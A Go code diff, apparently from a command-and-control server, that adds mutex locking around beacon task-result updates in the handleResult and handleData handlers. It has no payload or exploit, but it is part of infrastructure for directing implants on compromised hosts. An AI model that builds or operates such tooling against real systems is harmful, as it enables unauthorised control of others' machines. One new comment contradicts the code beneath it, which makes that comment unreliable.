@@ -902,22 +902,25 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 		logf("[C2] Result: %s → %s: %s", beaconID, taskID, preview)
 	}
 
-	// Update the task
-	if task, exists := c2.tasks[taskID]; exists {
+	// Update the task with mutex protection
+	c2.mutex.Lock()
+	task, exists := c2.tasks[taskID]
+	if exists {
 		task.Result = result
 		task.Status = "completed"
+	}
+	c2.mutex.Unlock()
 
-		// Save result to database (async)
-		if c2.db != nil {
-			go func(tid, bid, res string) {
-				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
-					logf("[C2] Failed to save task result to database: %v", err)
-				}
-				if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
-					logf("[C2] Failed to update task status in database: %v", err)
-				}
-			}(taskID, beaconID, result)
-		}
+	// Save result to database (async) - do this even if task not in memory
+	if c2.db != nil && exists {
+		go func(tid, bid, res string) {
+			if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
+				logf("[C2] Failed to save task result to database: %v", err)
+			}
+			if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
+				logf("[C2] Failed to update task status in database: %v", err)
+			}
+		}(taskID, beaconID, result)
 	}
 
 	return "ACK"
@@ -1075,14 +1078,17 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 			logf("[C2] Result: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
 		}
 
-		// Update the task
-		if task, exists := c2.tasks[taskID]; exists {
+		// Update the task with mutex protection
+		c2.mutex.Lock()
+		task, exists := c2.tasks[taskID]
+		if exists {
 			task.Result = result
 			task.Status = "completed"
 		}
+		c2.mutex.Unlock()
 
-		// Save result to database (async)
-		if c2.db != nil {
+		// Save result to database (async) - do this even if task not in memory
+		if c2.db != nil && exists {
 			go func(tid, bid, res string, chunks int) {
 				// Save the complete result
 				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
